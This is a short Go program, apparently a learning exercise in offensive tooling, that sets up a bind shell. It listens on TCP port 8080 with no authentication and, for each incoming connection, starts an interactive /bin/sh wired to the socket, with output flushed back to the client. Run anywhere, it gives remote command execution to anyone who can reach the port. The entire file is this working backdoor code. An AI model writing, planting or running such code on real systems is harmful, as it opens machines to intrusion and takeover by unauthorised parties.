package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)


type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := foo.w.Flush(); err != nil {
		return -1, err
	}

	return count, nil
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalln("Unable to bind port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}

		go handle(conn)
	}
}